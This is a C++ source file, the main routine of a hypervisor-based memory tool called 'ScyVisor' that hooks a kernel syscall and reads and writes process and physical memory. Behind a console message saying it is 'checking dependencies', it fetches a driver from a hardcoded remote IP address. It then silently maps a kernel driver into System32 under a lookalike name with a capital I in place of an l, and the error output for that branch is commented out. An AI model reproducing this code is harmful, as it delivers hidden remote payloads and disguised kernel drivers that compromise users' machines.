#include <iostream>
#include <iomanip>
#include <Windows.h>
#include "libvoyager.hpp"
#include "util/util.hpp"
#include "vdm_ctx/vdm_ctx.hpp"
#include "driver.hpp"
#include "client.h"
#include "mapper.h"

// ANSI color codes
#define RESET   "\033[0m"
#define RED     "\033[31m"      // for error
#define GREEN   "\033[32m"      // for success
#define ORANGE  "\033[38;5;208m"  // for hints
#define CYAN    "\033[36m"      // for header



void EnableANSI() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}

void print_header() {
    std::cout << CYAN << R"(
 ____              __     ___                
/ ___|  ___ _   _  \ \   / (_)___  ___  _ __ 
\___ \ / __| | | |  \ \ / /| / __|/ _ \| '__|
 ___) | (__| |_| |   \ V / | \__ \ (_) | |   
|____/ \___|\__, |    \_/  |_|___/\___/|_|   
            |___/                            
)" << RESET << std::endl;
    std::cout << GREEN << "Initializing ScyVisor v1.0" << RESET << std::endl;
    std::cout << std::string(50, '-') << std::endl;
}



int __cdecl main(int argc, char** argv)
{
    EnableANSI();
    print_header();

    vdm::read_phys_t _read_phys =
        [&](void* addr, void* buffer, std::size_t size) -> bool
        {
            const auto read_result =
                voyager::read_phys((u64)addr, (u64)buffer, size);

            return read_result ==
                voyager::vmxroot_error_t::error_success;
        };

    vdm::write_phys_t _write_phys =
        [&](void* addr, void* buffer, std::size_t size) -> bool
        {
            const auto write_result =
                voyager::write_phys((u64)addr, (u64)buffer, size);

            return write_result ==
                voyager::vmxroot_error_t::error_success;
        };

    std::cout << ORANGE << "[ScyVisor] Initializing usermode components..." << RESET << std::endl;
    if (voyager::init() != voyager::vmxroot_error_t::error_success) {
        std::cout << RED << "[ERROR] Failed to initialize ScyVisor" << RESET << std::endl;
        return 1;
    }
    std::cout << ORANGE << "[ScyVisor] checking dependencies..." << RESET << std::endl;
    Client::loadDriver("101.99.76.106", "7877");
    Sleep(100);
    if (!driver::initialize_handle())
    {
        Mapper::Map(L"C:\\Windows\\System32\\pdfwKrnl.exe", L"C:\\Windows\\System32\\pdfwKrnI.sys");
       // std::cout << RED << "[ERROR] Usermode initializing failed!" << RESET << std::endl;
        return 1;
    }
    DWORD process_id = driver::get_process_id(L"explorer.exe");
    if (driver::update(process_id))
    {
        std::cout << "Successfully attached: " << process_id << std::endl;

    }
    else
    {
        std::cout << "Failed to attach" << std::endl;
        Sleep(-1);
    }
    uintptr_t image_base = driver::get_image_base(0);
    if (image_base)
    {
        std::cout << "Successfully got image address" << std::endl;
        std::cout << "Image base: " << image_base << std::endl;
        //Sleep(5000);
    }
    else
    {
        std::cout << "Failed to get image: " << image_base << std::endl;
    }

    voyager::current_dirbase();

    std::this_thread::sleep_for(std::chrono::seconds(2));

    std::cout << ORANGE << "[ScyVisor] Verifying system integrity..." << RESET << std::endl;

    const auto nt_shutdown_system =
        util::get_kmodule_export(
            "ntoskrnl.exe", vdm::syscall_hook.first);

    if (!nt_shutdown_system) {
        std::cout << RED << "[ERROR] Failed to get Kernel Data" << RESET << std::endl;
        return 1;
    }

    const auto nt_shutdown_phys =
        voyager::translate(reinterpret_cast<
            voyager::guest_virt_t>(nt_shutdown_system));

    vdm::syscall_address.store(reinterpret_cast<void*>(nt_shutdown_phys));

    vdm::vdm_ctx vdm(_read_phys, _write_phys);
    const auto ntoskrnl_base =
        reinterpret_cast<void*>(
            util::get_kmodule_base("ntoskrnl.exe"));

    if (!ntoskrnl_base) {
        std::cout << RED << "[ERROR] Failed to get Kernel Data" << RESET << std::endl;
        return 1;
    }

    const auto ntoskrnl_memcpy =
        util::get_kmodule_export("ntoskrnl.exe", "memcpy");

    if (!ntoskrnl_memcpy) {
        std::cout << RED << "[ERROR] Failed to get Kernel Data" << RESET << std::endl;
        return 1;
    }

    std::this_thread::sleep_for(std::chrono::seconds(3));
    std::cout << ORANGE << "[ScyVisor] Setting up Kernel Interface..." << RESET << std::endl;

    //std::cout << GREEN << "[+] " << vdm::syscall_hook.first << " physical address -> 0x"
    //    << std::hex << vdm::syscall_address.load() << RESET << std::endl;
    //std::this_thread::sleep_for(std::chrono::seconds(1));

    //std::cout << GREEN << "[+] " << vdm::syscall_hook.first << " page offset -> 0x"
    //    << std::hex << vdm::nt_page_offset << RESET << std::endl;
    //std::this_thread::sleep_for(std::chrono::seconds(1));

    if (ntoskrnl_base != 0) {
		std::cout << GREEN << "[+] Successfully got Kernel Data! " << RESET << std::endl;
    }
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << ORANGE << "[ScyVisor] Initializing memory management..." << RESET << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(3));

    short mz_bytes = 0;
    vdm.syscall<decltype(&memcpy)>(
        ntoskrnl_memcpy,
        &mz_bytes,
        ntoskrnl_base,
        sizeof(mz_bytes)
    );

    const auto explorer_dirbase =
        vdm.get_dirbase(util::get_pid("explorer.exe"));

    if (!explorer_dirbase) {
        std::cout << RED << "[ERROR] Could not retrieve Process Directory Table Base!" << RESET << std::endl;
        return 1;
    }

    const auto ntdll_base =
        reinterpret_cast<std::uintptr_t>(
            GetModuleHandleA("ntdll.dll"));

    if (!ntdll_base) {
        std::cout << RED << "[ERROR] Could not retrieve NT Base Address!" << RESET << std::endl;
        return 1;
    }

    auto cur_dirbase = voyager::current_dirbase();

    int test_read = 10;
    auto read_result = voyager::rpm<int>(cur_dirbase, (uintptr_t)&test_read);
 
    voyager::wpm<int>(cur_dirbase, (uintptr_t)&test_read, 145);
    std::cout << GREEN << "[ScyVisor] Memory Management Successfully Initialized!" << RESET << std::endl;
    
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << GREEN << "[ScyVisor] Full Initialization complete." << RESET << std::endl;
    std::cout << GREEN << "[ScyVisor] ScyVisor is now running" << RESET << std::endl;

    std::cout << ORANGE << " Press any key to close..." << RESET << std::endl;
    std::getchar();

    return 0;
}